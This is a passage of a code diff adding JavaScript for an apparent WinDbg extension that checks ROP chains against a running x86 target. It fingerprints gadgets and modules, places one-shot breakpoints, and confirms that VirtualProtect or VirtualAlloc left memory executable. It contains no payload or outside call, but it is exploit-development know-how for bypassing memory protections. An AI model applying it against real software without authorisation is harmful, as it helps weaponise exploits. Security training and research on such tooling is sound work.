+      this.finished = false;
+    }
+    update(bytes) {
+      if (this.finished)
+        throw new Error("SHA-256 digest already finalized.");
+      this.length += __bi(bytes.length);
+      for (const byte of bytes) {
+        this.pending.push(byte);
+        if (this.pending.length === 64) {
+          this.compress(Uint8Array.from(this.pending));
+          this.pending = [];
+        }
+      }
+      return this;
+    }
+    digestHex() {
+      if (this.finished)
+        throw new Error("SHA-256 digest already finalized.");
+      this.finished = true;
+      const bitLength = __bi.mul(this.length, __bi(8));
+      this.pending.push(128);
+      while (this.pending.length % 64 !== 56)
+        this.pending.push(0);
+      for (let shift = 56; shift >= 0; shift -= 8) {
+        this.pending.push(Number(__bi.and(__bi.shr(bitLength, __bi(shift)), __bi(255))));
+      }
+      for (let offset = 0; offset < this.pending.length; offset += 64) {
+        this.compress(Uint8Array.from(this.pending.slice(offset, offset + 64)));
+      }
+      return Array.from(this.state, (word) => word.toString(16).padStart(8, "0")).join("");
+    }
+    compress(block) {
+      const words2 = new Uint32Array(64);
+      for (let index = 0; index < 16; index += 1) {
+        const offset = index * 4;
+        words2[index] = (block[offset] << 24 | block[offset + 1] << 16 | block[offset + 2] << 8 | block[offset + 3]) >>> 0;
+      }
+      for (let index = 16; index < 64; index += 1) {
+        const left = words2[index - 15];
+        const right = words2[index - 2];
+        const s0 = rotateRight(left, 7) ^ rotateRight(left, 18) ^ left >>> 3;
+        const s1 = rotateRight(right, 17) ^ rotateRight(right, 19) ^ right >>> 10;
+        words2[index] = words2[index - 16] + s0 + words2[index - 7] + s1 >>> 0;
+      }
+      let [a, b, c, d, e, f, g, h] = Array.from(this.state);
+      for (let index = 0; index < 64; index += 1) {
+        const s1 = rotateRight(e, 6) ^ rotateRight(e, 11) ^ rotateRight(e, 25);
+        const choice = e & f ^ ~e & g;
+        const temp1 = h + s1 + choice + ROUND[index] + words2[index] >>> 0;
+        const s0 = rotateRight(a, 2) ^ rotateRight(a, 13) ^ rotateRight(a, 22);
+        const majority = a & b ^ a & c ^ b & c;
+        const temp2 = s0 + majority >>> 0;
+        h = g;
+        g = f;
+        f = e;
+        e = d + temp1 >>> 0;
+        d = c;
+        c = b;
+        b = a;
+        a = temp1 + temp2 >>> 0;
+      }
+      this.state[0] = this.state[0] + a >>> 0;
+      this.state[1] = this.state[1] + b >>> 0;
+      this.state[2] = this.state[2] + c >>> 0;
+      this.state[3] = this.state[3] + d >>> 0;
+      this.state[4] = this.state[4] + e >>> 0;
+      this.state[5] = this.state[5] + f >>> 0;
+      this.state[6] = this.state[6] + g >>> 0;
+      this.state[7] = this.state[7] + h >>> 0;
+    }
+  };
+  function captureProofFingerprint(scope, adapter) {
+    const captured = adapter.getFingerprint(scope);
+    if (captured.ok)
+      return captured.value;
+    const registers = adapter.readRegisters();
+    return {
+      processId: __bi(0),
+      threadId: __bi(0),
+      architecture: "unknown",
+      pointerSize: 4,
+      targetPath: "",
+      complete: false,
+      incompleteReasons: [captured.error.message],
+      modules: [],
+      gadgets: [],
+      protections: []
+    };
+  }
+  function sameBytes2(left, right) {
+    return left.length === right.length && left.every((byte, index) => byte === right[index]);
+  }
+  function gadgetBytesMatch(address, baseline, current, ownedBreakpoint) {
+    if (sameBytes2(baseline, current))
+      return true;
+    if (!ownedBreakpoint || ownedBreakpoint.address !== address || !ownedBreakpoint.enabled)
+      return false;
+    if (baseline.length !== current.length || baseline.length === 0 || current[0] !== 204)
+      return false;
+    return baseline.slice(1).every((byte, index) => byte === current[index + 1]);
+  }
+  function compareProofFingerprint(baseline, current, options = {}) {
+    if (!baseline.complete || !current.complete || !baseline.targetSha256 || !current.targetSha256) {
+      const reasons2 = [...baseline.incompleteReasons, ...current.incompleteReasons];
+      if (!baseline.targetSha256 || !current.targetSha256)
+        reasons2.push("target SHA-256 is incomplete");
+      return { status: "INCOMPLETE", reasons: [...new Set(reasons2)] };
+    }
+    const reasons = [];
+    if (baseline.processId !== current.processId)
+      reasons.push("process identity changed");
+    if (baseline.threadId !== current.threadId)
+      reasons.push("thread identity changed");
+    if (baseline.architecture !== current.architecture || baseline.pointerSize !== current.pointerSize) {
+      reasons.push("target architecture changed");
+    }
+    if (baseline.targetPath !== current.targetPath)
+      reasons.push("target path changed");
+    if (baseline.targetSha256 !== current.targetSha256)
+      reasons.push("target SHA-256 changed");
+    for (const expected of baseline.modules) {
+      const observed = current.modules.find((module) => module.name === expected.name && module.path === expected.path);
+      if (!observed) {
+        reasons.push(`module ${expected.name} is no longer loaded`);
+        continue;
+      }
+      if (observed.base !== expected.base || observed.size !== expected.size) {
+        reasons.push(`module ${expected.name} mapping changed`);
+      }
+    }
+    for (const expected of baseline.gadgets) {
+      const observed = current.gadgets.find((entry) => entry.address === expected.address);
+      if (!observed) {
+        reasons.push(`gadget 0x${expected.address.toString(16)} is unavailable`);
+        continue;
+      }
+      if (observed.module !== expected.module || observed.rva !== expected.rva || !gadgetBytesMatch(expected.address, expected.bytes, observed.bytes, options.ownedBreakpoint)) {
+        reasons.push(`gadget 0x${expected.address.toString(16)} changed`);
+      }
+    }
+    for (const expected of baseline.protections) {
+      const observed = current.protections.find((entry) => entry.address === expected.address);
+      if (!observed || observed.region.base !== expected.region.base || observed.region.size !== expected.region.size || observed.region.protect !== expected.region.protect) {
+        reasons.push(`protection at 0x${expected.address.toString(16)} changed`);
+      }
+    }
+    return reasons.length > 0 ? { status: "STALE_TARGET", reasons } : { status: "CURRENT", reasons: [] };
+  }
+
+  // src/rop/proof/store.ts
+  function hex324(value) {
+    return value === void 0 ? void 0 : `0x${__bi.asUintN(32, value).toString(16).padStart(8, "0")}`;
+  }
+  function jsonSafe(value) {
+    if (typeof value === "bigint")
+      return hex324(value);
+    if (Array.isArray(value))
+      return value.map(jsonSafe);
+    if (value && typeof value === "object") {
+      return Object.fromEntries(Object.entries(value).map(([key2, entry]) => [key2, jsonSafe(entry)]));
+    }
+    return value;
+  }
+  function serializeProofRecord(session) {
+    return {
+      schemaVersion: PROOF_RECORD_SCHEMA_VERSION,
+      sessionId: session.id,
+      mode: session.mode,
+      state: session.state,
+      executionStatus: session.executionStatus,
+      objectiveStatus: session.objectiveStatus,
+      objectiveReason: session.objectiveReason,
+      targetPath: session.baselineFingerprint.targetPath,
+      targetSha256: session.baselineFingerprint.targetSha256,
+      observations: session.observations.map((observation2) => ({
+        checkpointId: observation2.checkpointId,
+        timestamp: observation2.timestamp,
+        outcome: observation2.outcome,
+        reason: observation2.reason,
+        assertions: observation2.assertions.map((assertion) => ({
+          subject: assertion.subject,
+          expectedExpression: assertion.expectedExpression,
+          expectedValue: hex324(assertion.expectedValue),
+          observedValue: hex324(assertion.observedValue),
+          status: assertion.status,
+          reason: assertion.reason,
+          differenceBytes: assertion.differenceBytes
+        }))
+      })),
+      events: session.events.map((event) => __spreadProps(__spreadValues({}, event), { detail: jsonSafe(event.detail) }))
+    };
+  }
+  function renderProofMarkdown(record) {
+    var _a, _b, _c;
+    const lines = [
+      `# ROP proof ${record.sessionId}`,
+      "",
+      `- Execution status: **${record.executionStatus}**`,
+      `- Objective status: **${record.objectiveStatus}** \u2014 ${record.objectiveReason}`,
+      `- Session state: ${record.state}`,
+      `- Target: ${record.targetPath || "unavailable"}`,
+      `- SHA-256: ${(_a = record.targetSha256) != null ? _a : "unavailable"}`,
+      "",
+      "## Checkpoints",
+      ""
+    ];
+    for (const observation2 of record.observations) {
+      lines.push(`### Checkpoint ${observation2.checkpointId}: ${observation2.outcome}`, "", observation2.reason, "");
+      for (const assertion of observation2.assertions) {
+        const values = assertion.expectedValue === void 0 && assertion.observedValue === void 0 ? "" : ` (expected ${(_b = assertion.expectedValue) != null ? _b : "unavailable"}, observed ${(_c = assertion.observedValue) != null ? _c : "unavailable"})`;
+        lines.push(`- ${assertion.subject}: **${assertion.status}**${values} \u2014 ${assertion.reason}`);
+      }
+      lines.push("");
+    }
+    lines.push("## Event log", "");
+    for (const event of record.events)
+      lines.push(`- ${event.sequence}: ${event.kind} (${event.timestamp})`);
+    return `${lines.join("\n")}
+`;
+  }
+  var ACTIVE_STATES = /* @__PURE__ */ new Set([
+    "ARMED",
+    "CHECKPOINT_REACHED",
+    "POSTCONDITION_ARMED",
+    "POSTCONDITION_OBSERVED"
+  ]);
+  var ProofSessionStore = class {
+    constructor() {
+      this.sessions = [];
+      this.eventSequence = 0;
+    }
+    add(session) {
+      if (this.active())
+        throw new Error("A ROP proof session is already active.");
+      this.sessions.push(session);
+      return session;
+    }
+    active() {
+      const session = this.sessions[this.sessions.length - 1];
+      return session && ACTIVE_STATES.has(session.state) ? session : void 0;
+    }
+    latest() {
+      return this.sessions[this.sessions.length - 1];
+    }
+    history() {
+      return this.sessions;
+    }
+    appendEvent(session, kind, detail = {}) {
+      const event = {
+        sequence: this.eventSequence,
+        timestamp: (/* @__PURE__ */ new Date()).toISOString(),
+        kind,
+        detail
+      };
+      this.eventSequence += 1;
+      session.events.push(event);
+      return event;
+    }
+  };
+
+  // src/rop/proof/postcondition.ts
+  var SUPPORTED_ARGUMENT_COUNTS = {
+    VirtualProtect: 4,
+    VirtualAlloc: 4
+  };
+  var DWORD_LIMIT = __bi(4294967296);
+  function uint32le(bytes, offset = 0) {
+    return __bi.or(__bi.or(__bi.or(__bi(bytes[offset]), __bi.shl(__bi(bytes[offset + 1]), __bi(8))), __bi.shl(__bi(bytes[offset + 2]), __bi(16))), __bi.shl(__bi(bytes[offset + 3]), __bi(24)));
+  }
+  function register(snapshot, name) {
+    const normalized = name.toLowerCase();
+    if (normalized === "eip")
+      return snapshot.eip;
+    if (normalized === "esp")
+      return snapshot.esp;
+    return snapshot.registers[normalized];
+  }
+  function captureStdcallFrame(api, esp, adapter) {
+    const argumentCount = SUPPORTED_ARGUMENT_COUNTS[api];
+    if (argumentCount === void 0) {
+      return { status: "UNVERIFIED", api, esp, arguments: [], rawBytes: new Uint8Array(), reason: `unsupported API ${api}` };
+    }
+    const length = (argumentCount + 1) * 4;
+    const read = adapter.readMemory(esp, length);
+    if (!read.ok || read.value.length !== length) {
+      return {
+        status: "UNVERIFIED",
+        api,
+        esp,
+        arguments: [],
+        rawBytes: read.ok ? read.value : new Uint8Array(),
+        reason: read.ok ? `runtime frame read returned ${read.value.length} of ${length} bytes` : read.error.message
+      };
+    }
+    const values = [];
+    for (let offset = 0; offset < length; offset += 4)
+      values.push(uint32le(read.value, offset));
+    return {
+      status: "VERIFIED",
+      api,
+      esp,
+      returnAddress: values[0],
+      arguments: values.slice(1),
+      rawBytes: read.value,
+      reason: "runtime stdcall frame captured"
+    };
+  }
+  function evaluatePostcondition(request, frame, returnObservation, adapter) {
+    const baseResult = {
+      status: "UNVERIFIED",
+      api: request.api,
+      returnAddress: frame.returnAddress,
+      protections: [],
+      reason: "postcondition could not be evaluated"
+    };
+    if (frame.status !== "VERIFIED" || frame.api !== request.api || frame.returnAddress === void 0) {
+      return __spreadProps(__spreadValues({}, baseResult), { reason: frame.reason });
+    }
+    if (returnObservation.eip !== frame.returnAddress) {
+      return __spreadProps(__spreadValues({}, baseResult), { status: "FAILED", reason: "execution stopped somewhere other than the captured API return address" });
+    }
+    if (request.api !== "VirtualProtect" && request.api !== "VirtualAlloc") {
+      return __spreadProps(__spreadValues({}, baseResult), { reason: `unsupported API ${request.api}` });
+    }
+    if (frame.arguments.length < 4)
+      return __spreadProps(__spreadValues({}, baseResult), { reason: "runtime frame is incomplete" });
+    const returnValue = register(returnObservation, "eax");
+    if (returnValue === void 0)
+      return __spreadProps(__spreadValues({}, baseResult), { reason: "EAX return value is unavailable" });
+    if (returnValue === __bi(0)) {
+      return __spreadProps(__spreadValues({}, baseResult), { status: "FAILED", returnValue, reason: `${request.api} returned failure` });
+    }
+    const rangeBase = request.api === "VirtualAlloc" ? returnValue : frame.arguments[0];
+    const rangeSize = frame.arguments[1];
+    if (rangeSize === __bi(0)) {
+      return __spreadProps(__spreadValues({}, baseResult), { status: "FAILED", returnValue, rangeBase, rangeSize, reason: "protected range has zero size" });
+    }
+    const rangeEnd = rangeBase + rangeSize;
+    if (rangeBase >= DWORD_LIMIT || rangeEnd > DWORD_LIMIT || rangeEnd <= rangeBase) {
+      return __spreadProps(__spreadValues({}, baseResult), { status: "FAILED", returnValue, rangeBase, rangeSize, reason: "protected range overflows x86 address space" });
+    }
+    const protections = [];
+    let cursor = rangeBase;
+    while (cursor < rangeEnd) {
+      const queried = adapter.queryProtection(cursor);
+      if (!queried.ok) {
+        return __spreadProps(__spreadValues({}, baseResult), { returnValue, rangeBase, rangeSize, protections, reason: queried.error.message });
+      }
+      const region = queried.value;
+      const regionEnd = region.base + region.size;
+      if (region.size <= __bi(0) || region.base > cursor || regionEnd <= cursor) {
+        return __spreadProps(__spreadValues({}, baseResult), { returnValue, rangeBase, rangeSize, protections, reason: "protection query did not advance range coverage" });
+      }
+      protections.push({ address: cursor, region });
+      if (!region.executable) {
+        return __spreadProps(__spreadValues({}, baseResult), { status: "FAILED", returnValue, rangeBase, rangeSize, protections, reason: "runtime range is not fully executable" });
+      }
+      cursor = regionEnd < rangeEnd ? regionEnd : rangeEnd;
+    }
+    return {
+      status: "VERIFIED",
+      api: request.api,
+      returnAddress: frame.returnAddress,
+      returnValue,
+      rangeBase,
+      rangeSize,
+      protections,
+      reason: `${request.api} succeeded and the runtime range is executable`
+    };
+  }
+
+  // src/rop/proof/session.ts
+  var MARKER_PREFIX = "osed-proof:";
+  var MARKER_V1 = /^osed-proof:v1:([A-Za-z0-9-]+):([A-Za-z0-9-]+):(\d+)$/;
+  var MARKER_ANY_VERSION = /^osed-proof:v([^:]+):/;
+  var sessionCounter = 0;
+  function fingerprintScope(plan) {
+    const gadgetAddresses = plan.checkpoints.flatMap((checkpoint) => checkpoint.provenance.flatMap((entry) => entry.address === void 0 ? [] : [entry.address]));
+    const moduleNames = plan.checkpoints.flatMap((checkpoint) => checkpoint.provenance.flatMap((entry) => entry.module === void 0 ? [] : [entry.module]));
+    return {
+      moduleNames: [...new Set(moduleNames)],
+      gadgetAddresses: [...new Set(gadgetAddresses)],
+      protectionAddresses: []
+    };
+  }
+  function ownedFrom(snapshot) {
+    return {
+      id: snapshot.id,
+      address: snapshot.address,
+      enabled: snapshot.enabled,
+      oneShot: snapshot.oneShot,
+      marker: snapshot.marker
+    };
+  }
+  var ProofSessionMachine = class {
+    constructor(adapter, store) {
+      this.adapter = adapter;
+      this.store = store;
+      this.priorRegisters = /* @__PURE__ */ new Map();
+      this.resolvedTargets = /* @__PURE__ */ new Map();
+    }
+    start(input) {
+      var _a, _b;
+      if (this.store.active())
+        throw new Error("A ROP proof session is already active.");
+      const orphans = this.markerBreakpoints().filter((entry) => MARKER_V1.test(entry.marker));
+      if (orphans.length > 0) {
+        throw new Error(`Found ${orphans.length} orphaned rop.prove breakpoint(s). Run rop.prove({action:"cancel", orphans:true}).`);
+      }
+      const baselineFingerprint = captureProofFingerprint(fingerprintScope(input.plan), this.adapter);
+      if (baselineFingerprint.architecture !== "x86" || baselineFingerprint.pointerSize !== 4) {
+        throw new Error("rop.prove v1 requires an x86 target with a four-byte pointer size.");
+      }
+      if (input.plan.checkpoints.length === 0)
+        throw new Error("The proof plan has no checkpoints.");
+      sessionCounter += 1;
+      const sessionId = (_a = input.sessionId) != null ? _a : `proof-${Date.now().toString(36)}-${sessionCounter}`;
+      const nonce = (_b = input.nonce) != null ? _b : `${Date.now().toString(36)}-${sessionCounter}`;
+      const session = {
+        id: sessionId,
+        mode: input.mode,
+        state: "CHECKPOINT_REACHED",
+        plan: input.plan,
+        checkpointIndex: 0,
+        baselineFingerprint,
+        observations: [],
+        events: [],
+        executionStatus: "UNVERIFIED",
+        objectiveStatus: "UNVERIFIED",
+        objectiveReason: "not requested",
+        postconditionRequested: input.postcondition === true
+      };
+      this.store.add(session);
+      this.store.appendEvent(session, "session-started", { mode: input.mode, nonce });
+      const current = this.adapter.readRegisters();
+      this.priorRegisters.set(session.id, current);
+      const first = input.plan.checkpoints[0];
+      const target = resolveProofExpression(first.target, current, current, this.adapter);
+      if (target.ok && target.value === current.eip) {
+        const observation2 = compareCheckpoint({ checkpoint: first, previous: current, resolvedTarget: target.value }, this.adapter);
+        session.observations.push(observation2);
+        session.checkpointIndex = 1;
+        this.store.appendEvent(session, "checkpoint-observed", { checkpointId: first.id, outcome: observation2.outcome });
+        if (observation2.outcome === "FAILED") {
+          session.state = "FAILED";
+          session.executionStatus = "FAILED";
+          return session;
+        }
+      }
+      return this.armOrComplete(session, nonce);
+    }
+    observeAndAdvance() {
+      var _a, _b;
+      const session = this.store.active();
+      if (!session)
+        throw new Error('No active proof session. Start one with rop.prove({mode:"guided"}).');
+      if (session.state === "POSTCONDITION_ARMED")
+        return this.observePostcondition(session);
+      if (session.checkpointIndex >= session.plan.checkpoints.length)
+        return this.complete(session);
+      const currentFingerprint = captureProofFingerprint(fingerprintScope(session.plan), this.adapter);
+      const fingerprint = compareProofFingerprint(session.baselineFingerprint, currentFingerprint, {
+        ownedBreakpoint: session.ownedBreakpoint
+      });
+      if (fingerprint.status === "STALE_TARGET") {
+        session.state = "STALE_TARGET";
+        session.executionStatus = "UNVERIFIED";
+        this.store.appendEvent(session, "stale-target", { reasons: fingerprint.reasons });
+        return session;
+      }
+      const checkpoint = session.plan.checkpoints[session.checkpointIndex];
+      const previous = (_a = this.priorRegisters.get(session.id)) != null ? _a : this.adapter.readRegisters();
+      const targetKey = `${session.id}:${checkpoint.id}`;
+      const capturedTarget = this.resolvedTargets.get(targetKey);
+      const target = capturedTarget === void 0 ? resolveProofExpression(checkpoint.target, previous, previous, this.adapter) : { ok: true, value: capturedTarget };
+      const observation2 = compareCheckpoint({
+        checkpoint,
+        previous,
+        resolvedTarget: target.ok ? target.value : void 0
+      }, this.adapter);
+      session.observations.push(observation2);
+      this.store.appendEvent(session, "checkpoint-observed", {
+        checkpointId: checkpoint.id,
+        outcome: observation2.outcome,
+        exceptionCode: (_b = observation2.registers.exceptionCode) == null ? void 0 : _b.toString(16)
+      });
+      if (observation2.outcome === "UNEXPECTED_STOP") {
+        session.state = "ARMED";
+        return session;
+      }
+      if (session.ownedBreakpoint) {
+        const deleted = this.adapter.deleteOwned(session.ownedBreakpoint);
+        this.store.appendEvent(session, "breakpoint-consumed", { status: deleted.status, id: session.ownedBreakpoint.id });
+        if (deleted.status === "identity-mismatch") {
+          session.state = "UNVERIFIED";
+          session.executionStatus = "UNVERIFIED";
+          return session;
+        }
+        session.ownedBreakpoint = void 0;
+      }
+      if (observation2.outcome === "FAILED") {
+        session.state = "FAILED";
+        session.executionStatus = "FAILED";
+        return session;
+      }
+      if (observation2.outcome === "UNVERIFIED")
+        session.executionStatus = "UNVERIFIED";
+      session.state = "CHECKPOINT_REACHED";
+      session.checkpointIndex += 1;
+      this.priorRegisters.set(session.id, observation2.registers);
+      const nonce = this.sessionNonce(session);
+      return this.armOrComplete(session, nonce);
+    }
+    status() {
+      return this.store.latest();
+    }
+    cancel() {
+      const session = this.store.active();
+      if (!session)
+        return this.store.latest();
+      if (session.ownedBreakpoint) {
+        const result3 = this.adapter.deleteOwned(session.ownedBreakpoint);
+        this.store.appendEvent(session, "breakpoint-cancelled", { id: session.ownedBreakpoint.id, status: result3.status });
+        if (result3.status === "identity-mismatch")
+          return session;
+        session.ownedBreakpoint = void 0;
+      }
+      session.state = "CANCELLED";
+      this.store.appendEvent(session, "session-cancelled");
+      return session;
+    }
+    cancelOrphans() {
+      const results = [];
+      for (const breakpoint of this.markerBreakpoints()) {
+        const version = MARKER_ANY_VERSION.exec(breakpoint.marker);
+        if (!version)
+          continue;
+        if (!MARKER_V1.test(breakpoint.marker)) {
+          results.push({ status: "unsupported-marker-version", breakpoint });
+          continue;
+        }
+        results.push(this.adapter.deleteOwned(ownedFrom(breakpoint)));
+      }
+      return results;
+    }
+    armOrComplete(session, nonce) {
+      var _a;
+      if (session.checkpointIndex >= session.plan.checkpoints.length)
+        return this.complete(session);
+      const checkpoint = session.plan.checkpoints[session.checkpointIndex];
+      const previous = (_a = this.priorRegisters.get(session.id)) != null ? _a : this.adapter.readRegisters();
+      const resolved = resolveProofExpression(checkpoint.target, previous, previous, this.adapter);
+      if (!resolved.ok) {
+        session.state = "UNVERIFIED";
+        session.executionStatus = "UNVERIFIED";
+        this.store.appendEvent(session, "dynamic-target-unresolved", { checkpointId: checkpoint.id, reason: resolved.reason });
+        return session;
+      }
+      if (checkpoint.dynamic) {
+        this.store.appendEvent(session, "dynamic-target-resolved", {
+          checkpointId: checkpoint.id,
+          target: `0x${resolved.value.toString(16)}`
+        });
+      }
+      this.resolvedTargets.set(`${session.id}:${checkpoint.id}`, resolved.value);
+      if (session.mode === "observe") {
+        session.state = "ARMED";
+        return session;
+      }
+      const marker = `${MARKER_PREFIX}v1:${session.id}:${nonce}:${checkpoint.id}`;
+      const armed = this.adapter.setOneShot(resolved.value, marker);
+      if (!armed.ok) {
+        session.state = "UNVERIFIED";
+        this.store.appendEvent(session, "breakpoint-arm-failed", { reason: armed.error.message });
+        return session;
+      }
+      session.ownedBreakpoint = armed.value;
+      session.state = "ARMED";
+      this.store.appendEvent(session, "breakpoint-armed", { id: armed.value.id, address: `0x${armed.value.address.toString(16)}` });
+      return session;
+    }
+    complete(session) {
+      const incomplete = !session.baselineFingerprint.complete || session.plan.incompleteReasons.length > 0 || session.observations.some((observation2) => observation2.outcome === "UNVERIFIED");
+      session.executionStatus = incomplete ? "UNVERIFIED" : "VERIFIED";
+      this.store.appendEvent(session, "execution-complete", { executionStatus: session.executionStatus });
+      if (session.postconditionRequested && session.plan.api) {
+        const current = this.adapter.readRegisters();
+        const frame = captureStdcallFrame(session.plan.api, current.esp, this.adapter);
+        session.runtimeFrame = frame;
+        session.objectiveReason = frame.reason;
+        if (frame.status !== "VERIFIED" || frame.returnAddress === void 0) {
+          session.state = "EXECUTION_COMPLETE";
+          return session;
+        }
+        const marker = `${MARKER_PREFIX}v1:${session.id}:${this.sessionNonce(session)}:${session.plan.checkpoints.length}`;
+        if (session.mode === "guided") {
+          const armed = this.adapter.setOneShot(frame.returnAddress, marker);
+          if (!armed.ok) {
+            session.state = "EXECUTION_COMPLETE";
+            session.objectiveReason = armed.error.message;
+            return session;
+          }
+          session.ownedBreakpoint = armed.value;
+          this.store.appendEvent(session, "postcondition-breakpoint-armed", {
+            id: armed.value.id,
+            address: `0x${armed.value.address.toString(16)}`
+          });
+        }
+        session.state = "POSTCONDITION_ARMED";
+        return session;
+      }
+      session.state = "EXECUTION_COMPLETE";
+      return session;
+    }
+    observePostcondition(session) {
+      const frame = session.runtimeFrame;
+      if (!frame || !session.plan.api) {
+        session.state = "POSTCONDITION_FAILED";
+        session.objectiveStatus = "UNVERIFIED";
+        session.objectiveReason = "captured runtime frame is unavailable";
+        return session;
+      }
+      const registers = this.adapter.readRegisters();
+      if (frame.returnAddress !== registers.eip) {
+        this.store.appendEvent(session, "postcondition-unexpected-stop", {
+          expected: frame.returnAddress === void 0 ? void 0 : `0x${frame.returnAddress.toString(16)}`,
+          observed: `0x${registers.eip.toString(16)}`
+        });
+        return session;
+      }
+      if (session.ownedBreakpoint) {
+        const deleted = this.adapter.deleteOwned(session.ownedBreakpoint);
+        this.store.appendEvent(session, "postcondition-breakpoint-consumed", { status: deleted.status });
+        if (deleted.status === "identity-mismatch")
+          return session;
+        session.ownedBreakpoint = void 0;
+      }
+      const objective = evaluatePostcondition({ api: session.plan.api }, frame, registers, this.adapter);
+      session.objectiveObservation = objective;
+      session.objectiveStatus = objective.status;
+      session.objectiveReason = objective.reason;
+      session.state = objective.status === "VERIFIED" ? "POSTCONDITION_OBSERVED" : "POSTCONDITION_FAILED";
+      this.store.appendEvent(session, "postcondition-observed", { status: objective.status, reason: objective.reason });
+      return session;
+    }
+    markerBreakpoints() {
+      const listed = this.adapter.listBreakpoints();
+      if (!listed.ok)
+        return [];
+      return listed.value.filter((entry) => entry.marker.startsWith(MARKER_PREFIX));
+    }
+    sessionNonce(session) {
+      const start = session.events.find((event) => event.kind === "session-started");
+      return typeof (start == null ? void 0 : start.detail.nonce) === "string" ? start.detail.nonce : "session";
+    }
+  };
+
+  // src/rop/proof/controller.ts
+  var ProofController = class {
+    constructor(dependencies) {
+      this.dependencies = dependencies;
+      this.machine = new ProofSessionMachine(dependencies.adapter, dependencies.store);
+    }
+    execute(options) {
+      var _a, _b, _c, _d, _e, _f;
+      try {
+        if (options === void 0) {
+          if (!this.dependencies.store.active()) {
+            return { success: false, error: 'No active proof session. Start one with rop.prove({mode:"guided"}).' };
+          }
+          return this.outcome(this.machine.observeAndAdvance());
+        }
+        if (options.action === "status") {
+          const session2 = this.machine.status();
+          return session2 ? this.outcome(session2) : { success: false, error: "No proof session has been recorded." };
+        }
+        if (options.action === "history") {
+          return { success: true, history: this.dependencies.store.history() };
+        }
+        if (options.action === "cancel") {
+          const session2 = this.machine.cancel();
+          const orphanResults = options.orphans ? this.machine.cancelOrphans() : void 0;
+          return { success: false, session: session2, orphanResults };
+        }
+        if (options.action === "export") {
+          const session2 = this.dependencies.store.latest();
+          if (!session2)
+            return { success: false, error: "No proof session has been recorded." };
+          if (!options.path)
+            return { success: false, error: "Proof export requires an explicit path." };
+          const record = serializeProofRecord(session2);
+          const markdown = options.format === "markdown" || /\.md$/i.test(options.path);
+          const content = markdown ? renderProofMarkdown(record) : `${JSON.stringify(record, null, 2)}
+`;
+          if (!this.dependencies.writeText)
+            return { success: false, error: "Proof export is unavailable in this host." };
+          this.dependencies.writeText(options.path, content);
+          return {
+            success: session2.executionStatus === "VERIFIED" && session2.objectiveStatus === "VERIFIED",
+            session: session2,
+            exportedPath: options.path,
+            content
+          };
+        }
+        if (this.dependencies.store.active()) {
+          return { success: false, error: "A ROP proof session is already active; inspect status or cancel it first." };
+        }
+        const inherited = this.dependencies.getDefaultInput();
+        const chain = (_a = options.chain) != null ? _a : inherited == null ? void 0 : inherited.chain;
+        if (chain === void 0) {
+          return { success: false, error: "No chain to prove. Run rop.generate first or pass {chain: ...}." };
+        }
+        const input = {
+          chain,
+          corpus: (_d = (_c = (_b = this.dependencies).getCorpus) == null ? void 0 : _c.call(_b)) != null ? _d : inherited == null ? void 0 : inherited.corpus,
+          api: (_e = options.api) != null ? _e : inherited == null ? void 0 : inherited.api
+        };
+        const plan = buildProofPlan(input, this.dependencies.adapter);
+        const session = this.machine.start({
+          mode: (_f = options.mode) != null ? _f : "guided",
+          plan,
+          postcondition: options.postcondition === true
+        });
+        return this.outcome(session);
+      } catch (error2) {
+        return { success: false, error: error2 instanceof Error ? error2.message : String(error2) };
+      }
+    }
+    outcome(session) {
+      return {
+        success: session.executionStatus === "VERIFIED" && session.objectiveStatus === "VERIFIED",
+        session
+      };
+    }
+  };
+
+  // src/rop/proof/windbg_adapter.ts
+  function ok(value) {
+    return { ok: true, value };
+  }
+  function fail(code, message) {
+    return { ok: false, error: { code, message } };
+  }
+  function bigintValue(value) {
+    var _a, _b;
+    try {
+      if (typeof value === "bigint")
+        return value;
+      if (typeof value === "number")
+        return __bi(value);
+      if (typeof value === "string")
+        return __bi(value.replace(/`/g, ""));
+      if (value && typeof value === "object") {
+        const record = value;
+        return bigintValue((_b = (_a = record.value) != null ? _a : record.Value) != null ? _b : String(value));
+      }
+    } catch (e) {
+    }
+    return void 0;
+  }
+  function isAllowedProofCommand(command2) {
+    const trimmed = command2.trim();
+    return trimmed === "bl" || /^r(?:\s+@[a-z][a-z0-9]*)+$/i.test(trimmed) || /^u\s+0x[0-9a-f]+\s+L[1-9][0-9]*$/i.test(trimmed) || /^!vprot\s+0x[0-9a-f]+$/i.test(trimmed) || /^bp\s+\/1\s+0x[0-9a-f]+\s+"\.echo\s+osed-proof:v1:[A-Za-z0-9-]+:[A-Za-z0-9-]+:\d+"$/i.test(trimmed) || /^bc\s+\d+$/i.test(trimmed);
+  }
+  function command(commandText) {
+    if (!isAllowedProofCommand(commandText))
+      throw new Error(`Proof adapter rejected debugger command: ${commandText}`);
+    return executeDebuggerCommand(commandText);
+  }
+  function iterable(value) {
+    if (Array.isArray(value))
+      return value;
+    try {
+      return value ? Array.from(value) : [];
+    } catch (e) {
+      return [];
+    }
+  }
+  function parseBreakpoint(line) {
+    var _a;
+    const marker = (_a = /(osed-proof:v[^\s";]+)/i.exec(line)) == null ? void 0 : _a[1];
+    const match = /^\s*(\d+)\s+\w+\s+([0-9a-f`]+)/i.exec(line);
+    if (!match || !marker)
+      return void 0;
+    return {
+      id: Number(match[1]),
+      address: __bi(`0x${match[2].replace(/`/g, "")}`),
+      enabled: !/^\s*\d+\s+d/i.test(line),
+      oneShot: /\/1|one.?shot/i.test(line) || marker.startsWith("osed-proof:"),
+      marker,
+      command: line
+    };
+  }
+  function hashFile(path) {
+    var _a, _b, _c, _d, _e, _f, _g;
+    try {
+      const hostAny = host;
+      const fs = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.Utility) == null ? void 0 : _c.FileSystem;
+      const raw = (_f = (_d = fs == null ? void 0 : fs.OpenFile) == null ? void 0 : _d.call(fs, path)) != null ? _f : (_e = fs == null ? void 0 : fs.CreateFile) == null ? void 0 : _e.call(fs, path, "OpenExisting");
+      if (!raw)
+        return void 0;
+      const file = raw;
+      if (typeof file.ReadBytes !== "function")
+        return void 0;
+      const digest = new Sha256();
+      for (; ; ) {
+        const chunk = Uint8Array.from(iterable(file.ReadBytes(64 * 1024)).map(Number));
+        if (chunk.length === 0)
+          break;
+        digest.update(chunk);
+        if (chunk.length < 64 * 1024)
+          break;
+      }
+      (_g = file.Close) == null ? void 0 : _g.call(file);
+      return digest.digestHex();
+    } catch (e) {
+      return void 0;
+    }
+  }
+  var WinDbgProofAdapter = class {
+    readRegisters() {
